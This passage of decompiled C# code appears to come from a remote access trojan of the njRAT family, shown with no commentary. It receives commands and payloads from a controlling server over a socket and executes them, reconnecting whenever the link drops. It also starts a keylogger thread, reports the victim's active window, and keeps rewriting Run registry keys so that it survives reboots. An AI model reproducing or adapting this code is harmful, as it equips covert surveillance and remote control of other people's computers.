                      if (num1 == -1L)
                      {
                        string str = "";
                        while (true)
                        {
                          int CharCode = OK.C.GetStream().ReadByte();
                          switch (CharCode)
                          {
                            case -1:
                              goto label_20;
                            case 0:
                              goto label_11;
                            default:
                              str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                              continue;
                          }
                        }
label_11:
                        num1 = Conversions.ToLong(str);
                        if (num1 == 0L)
                        {
                          OK.Send("");
                          num1 = -1L;
                        }
                      }
                      else
                        goto label_15;
                    }
                    else
                      goto label_20;
                  }
                  while (OK.C.Available > 0);
                  continue;
label_15:
                  OK.b = new byte[checked (OK.C.Available + 1)];
                  long num3 = checked (num1 - OK.MeM.Length);
                  if ((long) OK.b.Length > num3)
                    OK.b = new byte[checked ((int) (num3 - 1L) + 1)];
                  int count = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None);
                  OK.MeM.Write(OK.b, 0, count);
                }
                else
                  goto label_20;
              }
              while (OK.MeM.Length != num1);
              num1 = -1L;
              Thread thread = new Thread((ParameterizedThreadStart) (a0 => OK.Ind((byte[]) a0)), 1);
              thread.Start((object) OK.MeM.ToArray());
              thread.Join(100);
              OK.MeM.Dispose();
              OK.MeM = new MemoryStream();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
label_20:
        do
        {
          try
          {
            if (OK.PLG != null)
            {
              NewLateBinding.LateCall(OK.PLG, (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              OK.PLG = (object) null;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          OK.Cn = false;
        }
        while (!OK.connect());
        OK.Cn = true;
      }
    }

    public static void ko()
    {
      if (Interaction.Command() != null)
      {
        try
        {
          OK.F.Registry.CurrentUser.SetValue("di", (object) "!");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(5000);
      }
      bool createdNew = false;
      OK.MT = (object) new Mutex(true, OK.RG, out createdNew);
      if (!createdNew)
        ProjectData.EndApp();
      OK.INS();
      if (!OK.Idr)
      {
        OK.EXE = OK.LO.Name;
        OK.DR = OK.LO.Directory.Name;
      }
      new Thread(new ThreadStart(OK.RC), 1).Start();
      try
      {
        OK.kq = new kl();
        new Thread(new ThreadStart(OK.kq.WRK), 1).Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num = 0;
      string Left = "";
      if (OK.BD)
      {
        try
        {
          SystemEvents.SessionEnding += (SessionEndingEventHandler) ((a0, a1) => OK.ED());
          OK.pr(1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      while (true)
      {
        Thread.Sleep(1000);
        if (!OK.Cn)
          Left = "";
        Application.DoEvents();
        try
        {
          checked { ++num; }
          if (num == 5)
          {
            try
            {
              Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          if (num >= 8)
          {
            num = 0;
            string Right = OK.ACT();
            if (Operators.CompareString(Left, Right, false) != 0)
            {
              Left = Right;
              OK.Send("act" + OK.Y + Right);
            }
          }
          if (OK.Isu)
          {
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.CurrentUser.GetValue(OK.sf + "\\" + OK.RG, (object) ""), (object) ("\"" + OK.LO.FullName + "\" .."), false))
                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.LocalMachine.GetValue(OK.sf + "\\" + OK.RG, (object) ""), (object) ("\"" + OK.LO.FullName + "\" .."), false))
                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
